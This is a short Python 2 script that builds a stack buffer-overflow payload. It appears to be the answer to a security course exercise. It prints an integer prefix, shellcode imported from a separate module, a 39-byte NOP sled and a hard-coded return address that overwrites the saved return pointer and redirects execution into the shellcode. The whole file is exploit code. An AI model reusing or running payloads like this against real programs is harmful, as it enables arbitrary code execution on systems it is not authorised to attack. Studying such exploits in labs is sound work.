from shellcode import shellcode

def main():
    #value = '\xff\xff\xff\xff'
    value = '\x09\x00\x00\x40'
    print value + shellcode+(39 * '\x90')+'\xb0\xbd\xfe\xbf'
            
main()
